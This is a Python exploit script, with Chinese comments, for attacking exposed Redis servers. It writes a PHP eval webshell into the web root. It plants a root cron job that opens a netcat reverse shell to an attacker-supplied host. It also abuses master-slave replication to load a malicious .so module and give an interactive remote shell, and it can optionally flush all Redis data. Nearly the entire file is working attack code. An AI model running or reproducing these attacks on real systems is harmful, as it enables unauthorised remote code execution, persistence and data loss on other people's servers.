# coding:utf-8
import socket
import argparse
import time


# 仅支持python3
# redis攻击脚本，写入webshell，计划任务反弹，slave主从复制。

CRLF = '\r\n'

# 处理发送和接受socks的函数
def send(ss,cmd_str):
    print('-->  ',cmd_str)
    ss.send(Redis_payload.redis_format(cmd_str))
    print(ss.recv(30*1024).decode('utf-8'))



# 向redis写文件的类，
class Redis_payload:
    
    def __init__(self,rhost,rport,target_path,target_name,payload,flushall):
        self.rhost = rhost
        self.rport = rport
        self.target_path = target_path
        self.target_name = target_name
        self.payload = payload
        self.flushall = flushall
        self.initiallize()

    def initiallize(self):
        self.cmd = [
        'flushall',
        'set 1 {shell}'.format(shell=self.payload),
        'config set dir {target_path}'.format(target_path=self.target_path),
        'config set dbfilename {target_name}'.format(target_name=self.target_name),
        'save'
        ]

        if not self.flushall:
            self.cmd.pop(0)

    
    @classmethod
    def redis_format(self,command):          #格式化，redis交互的字符串
        cmd = []
        if isinstance(command,list):
            cmd = command
        else:
            cmd.append(command)

        result = []
        for x in range(len(cmd)):
            rn_list = cmd[x].split(' ')              # 进行空格切分
            rn_zong_len = len(rn_list)              # *? 表示总长度的获取
            for y in range(len(rn_list)):
                rn_list[y] = '$'+str(len(rn_list[y]))+CRLF+rn_list[y].replace("^",' ')
            

            result.append('*'+str(rn_zong_len)+CRLF+CRLF.join(rn_list)+CRLF)
        return ''.join(result).encode('utf-8')


    def run(self):
        ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print("IP为：{ip}，端口为：{port}".format(ip=self.rhost,port=self.rport))
        ss.connect((self.rhost,self.rport))
        send(ss,self.cmd)



# 进行slave写入的函数
class Redis_slave_exp():
    
    def __init__(self,rhost,rport,lhost,lport,exp_name='exp.so'):
        self.rhost = rhost
        self.rport = rport
        self.lhost = lhost
        self.lport = lport
        self.exp_name = exp_name


    def run(self):
        
        try:
            self.payload = open('exp.so','rb').read()
        except FileNotFoundError as f:
            exit("\n\n\n!!!exp.so文件不存在，无法进行slave攻击")
        
        ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        
        try:
            ss.connect((self.rhost,self.rport))
        except OSError as f:
            exit("\n\n!!!无法连接到{}".format(self.rhost))
        send(ss,'slaveof {host} {port}'.format(host=self.lhost,port=self.lport))
        send(ss,'config set dbfilename {}'.format(self.exp_name))

        # 开始伪装本地的redis主服务器，
        self.redis_master()

        # 加载恶意.so文件
        send(ss,'MODULE LOAD ./{}'.format(self.exp_name))
        self.interact_shell(ss)
    


    def redis_master(self):
        s_master = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s_master.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        print("开始准备监听{}端口……(ps.如果一直卡在这，多半是端口被占用了)".format(self.lport))
        try:
            s_master.bind((self.lhost,self.lport))
        except Exception as f:
            exit("本地的{}被占用".format(str(self.lport)))
        s_master.listen(7)
        ss,addr = s_master.accept()
        print("开始捕捉到连接")
        while True:
            r_content = ss.recv(30*1024).decode('utf-8')
            if r_content:

                # 输出交互的内容
                self.interactive_recv(r_content)
            if 'PING' in r_content :
                ss.send('+PONG\r\n'.encode('utf-8'))
                self.interactive_send('+PONG')
            elif 'REPLCONF' in r_content or 'capa' in r_content:
                ss.send('+OK\r\n'.encode('utf-8'))
                self.interactive_send('+OK')
            elif 'PSYNC' in r_content or 'SYNC' in r_content :
                result = '+FULLRESYNC'+'c'*40+'1'+CRLF      # 确定连接方式。并且目标备份master的RDB文件
                result += '$'+str(len(self.payload))+CRLF
                result = result.encode('utf-8')
                result += self.payload
                result += CRLF.encode('utf-8')
                ss.send(result)
                self.interactive_send("已经发送.so恶意文件")
                time.sleep(2)
                return 

    def interact_shell(self,ss):
        while True:
            try:
                input_str = input("shell >> ")
                input_str = input_str.replace(' ','^')
                if input_str == 'exit':
                    exit("退出")
                send(ss,"system.exec "+input_str)
            except Exception as identifier:
                pass

    def interactive_recv(self,content):
        print('<--\n',content)
    def interactive_send(self,content):
        print('-->\n',content)




def parse_arg():
    parse = argparse.ArgumentParser(description="redis 利用脚本\n\n使用示例：python3 redis_exp_0.py 192.168.2.138 6379 -m slave -lh 192.168.2.18 -lp 9998")
    parse.add_argument('rhost',help="目标IP：示例192.168.2.139",type=str)
    parse.add_argument('rport',help='目标端口。不填,默认为6379。示例：6379',nargs='?',default=6379,type=int)
    parse.add_argument('-m','--model',help='指定使用哪种模式进行攻击写入shell',choices=['crontab','webshell','ssh_ket','slave'],required=True)
    parse.add_argument('--target_path',help='手动指定写入文件路径',type=str,default='no')
    parse.add_argument('--target_name',help="手动指定写入文件名",type=str,default='no')
    parse.add_argument('--initialize',help='''指定写入shell的时候，使用flushall,清扫redis内存中的数据。
    \n此选项可能会造成redis内存中的数据丢失！！！，默认为false''',default=False,type=bool)
    parse.add_argument('-lh','--lhost',type=str,help="指定回弹的本地IP")
    parse.add_argument('-lp','--lport',type=int,help="指定回弹的本地端口")
    # parse.add_argument('--cmd',help='手动指定写入的文件内容')
    args = parse.parse_args()
    return args



if __name__ == "__main__":
    args = parse_arg()

    if args.model == 'webshell':
        if args.target_path == 'no':
            args.target_path = '/var/www/html'
        if args.target_name == 'no':
            args.target_name = 'shell.php'
        exp = Redis_payload(args.rhost,args.rport,args.target_path,args.target_name,"<?php^show_source(__FILE__);@eval($_POST[a])?>",args.initialize)
        exp.run()
    elif args.model == 'crontab':
        if not args.lhost or not args.lport:
            exit("!!!未输入回弹端口或IP") 
        if args.target_path == 'no':
            args.target_path = '/var/spool/cron/'
        if args.target_name == 'no':
            args.target_name = 'root'
        exp = Redis_payload(args.rhost,args.rport,args.target_path,args.target_name,"\n\n*/1^*^*^*^*^nc^{lhost}^{lport}^-e^/bin/bash^^\n\n\n".format(lhost=args.lhost,lport=args.lport),args.initialize)
        exp.run()
    elif args.model == 'slave':
        if not args.lhost or not args.lport:
            exit("!!!未输入回弹端口或IP") 
        redis = Redis_slave_exp(args.rhost,args.rport,args.lhost,args.lport)
        print(args.rhost,args.rport,args.lhost,args.lport)
        redis.run()
    elif args.model == 'ssk_key':
        exit("暂时不提供ssh秘钥登录，等待更新")
        if args.target_path == 'no':
            args.target_path = '~/.ssh'
        if args.target_name == 'no':
            args.target_name = 'authorized_keys'
        exp = Redis_payload(args.rhost,args.rport,args.target_path,args.target_name,)
